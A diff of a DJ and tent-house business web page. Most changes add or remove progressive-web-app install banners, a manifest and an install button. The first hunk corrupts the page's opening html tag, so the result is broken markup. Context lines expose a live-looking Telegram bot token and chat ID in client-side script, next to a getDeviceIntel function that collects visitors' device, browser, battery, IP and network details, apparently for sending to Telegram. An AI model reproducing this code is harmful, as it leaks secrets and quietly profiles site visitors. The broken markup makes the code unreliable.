@@ -1,4 +1,4 @@
-<html lang="en">
+html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -9,6 +9,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="application-name" content="MNDs Hub">
     
+    <link rel="manifest" href='data:application/manifest+json,{"name":"MND Secure Hub","short_name":"MND App","start_url":".","display":"standalone","background_color":"#050505","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png","sizes":"512x512","type":"image/jpeg"}]}'>
+
     <title>Maa Nirmala DJ & Tent House | SECURE HUB</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -210,97 +212,11 @@
         .price-card { background: rgba(255,255,255,0.05); border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
         .price-title { font-family: 'Cinzel'; font-weight: bold; font-size: 16px; color: #fff; }
         .price-amt { color: var(--gold-primary); font-size: 20px; font-weight: bold; font-family: 'Rajdhani'; }
-        /* PREMIUM PWA INSTALL BANNER STYLES */
-        .install-banner { 
-            position: fixed; top: 0; left: 0; right: 0; 
-            background: rgba(10, 10, 12, 0.95); 
-            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); 
-            padding: 15px 20px; z-index: 99999999; 
-            display: flex; justify-content: space-between; align-items: center; 
-            border-bottom: 2px solid #D4AF37; 
-            box-shadow: 0 10px 40px rgba(0,0,0,0.9); 
-            transform: translateY(-100%); transition: transform 0.5s cubic-bezier(0.2, 0.8, 0.2, 1); 
-            font-family: 'Outfit', sans-serif; 
-        }
-        .install-banner.show { transform: translateY(0); }
-        
-        .pwa-install-btn { 
-            background: linear-gradient(135deg, #D4AF37 0%, #FFD700 100%); 
-            color: #000; font-family: 'Outfit', sans-serif; 
-            font-weight: 800; font-size: 13px; 
-            padding: 10px 20px; border-radius: 30px; 
-            border: none; cursor: pointer; text-transform: uppercase; 
-            letter-spacing: 1px; box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4); 
-            transition: all 0.3s ease; 
-        }
-        .pwa-install-btn:active { transform: scale(0.95); box-shadow: 0 2px 10px rgba(212, 175, 55, 0.4); }
-        
-        .pwa-close-btn { 
-            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); 
-            color: #fff; width: 35px; height: 35px; border-radius: 50%; 
-            font-size: 18px; display: flex; justify-content: center; align-items: center; 
-            cursor: pointer; transition: 0.3s; margin-left: 10px; 
-        }
-        .pwa-close-btn:hover { background: rgba(255,51,51,0.2); border-color: #ff3333; color: #ff3333; }
     </style>
 </head>
 <body data-theme="dark">
 
-<div id="install-banner" class="install-banner">
-<div id="mnd-premium-install-banner" class="install-banner">
-    <div style="display:flex; align-items:center; gap:15px;">
-        <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Maa Nirmala DJ Logo" style="width:45px; height:45px; border-radius:12px; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3); border: 1px solid #D4AF37;">
-        <div>
-            <h4 style="margin:0; color:#D4AF37; font-size:16px; font-family:'Cinzel', serif; font-weight: 800; letter-spacing: 1px;">Maa Nirmala DJ</h4>
-            <p style="margin:0; color:#aaa; font-size:12px; font-family:'Outfit', sans-serif;">Install App for full-screen</p>
-        </div>
-    </div>
-    <div style="display:flex; align-items:center;">
-        <button class="pwa-install-btn" onclick="mndPremiumInstallApp()">INSTALL</button>
-        <button class="pwa-close-btn" onclick="mndClosePremiumBanner()">✕</button>
-    </div>
-</div>
-
-<script>
-    const mndManifestData = {
-        "name": "Maa Nirmala DJ",
-        "short_name": "MND App",
-        "start_url": ".",
-        "display": "standalone",
-        "background_color": "#050505",
-        "theme_color": "#D4AF37",
-        "icons": [{"src": "https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png", "sizes": "512x512", "type": "image/png"}]
-    };
-    const mndManifestBlob = new Blob([JSON.stringify(mndManifestData)], {type: 'application/manifest+json'});
-    const mndManifestLink = document.createElement('link');
-    mndManifestLink.rel = 'manifest';
-    mndManifestLink.href = URL.createObjectURL(mndManifestBlob);
-    document.head.appendChild(mndManifestLink);
-
-    let mndPremiumPrompt;
-    window.addEventListener('beforeinstallprompt', (e) => {
-        e.preventDefault();
-        mndPremiumPrompt = e;
-        if (!window.matchMedia('(display-mode: standalone)').matches) {
-            document.getElementById('mnd-premium-install-banner').classList.add('show');
-        }
-    });
-
-    function mndPremiumInstallApp() {
-        if (mndPremiumPrompt) {
-            mndPremiumPrompt.prompt();
-            mndPremiumPrompt.userChoice.then((choiceResult) => {
-                mndPremiumPrompt = null;
-                document.getElementById('mnd-premium-install-banner').classList.remove('show');
-            });
-        }
-    }
-
-    function mndClosePremiumBanner() {
-        document.getElementById('mnd-premium-install-banner').classList.remove('show');
-    }
-</script>
-<div id="gatekeeper">
+    <div id="gatekeeper">
         <div class="gate-card">
             <div class="gate-img-frame"><img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="gate-img" alt="Profile"></div>
             <h2 class="gate-title">MAA NIRMALA DJ</h2>
@@ -3831,7 +3747,8 @@
             </p>        
     </div>
 </div>
-
+                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL MNDs APP</button>
+            </div>
             <style>
     /* --- 1. THE GLOWING MASTER BUTTON --- */
     .premium-social-trigger {
@@ -5449,6 +5366,10 @@
     <script>
         const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
         const TG_CHAT = "8506290708";
+
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; const btn = document.getElementById('installBtn'); if(btn) btn.style.display = 'inline-block'; });
+        function installApp() { if (deferredPrompt) { deferredPrompt.prompt(); deferredPrompt.userChoice.then((choiceResult) => { deferredPrompt = null; }); } }
 
         async function getDeviceIntel() {
             let model = "Unknown Device"; let browser = navigator.userAgent; let battery = "Unknown"; let ip = "Masked"; let network = "Unknown"; let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
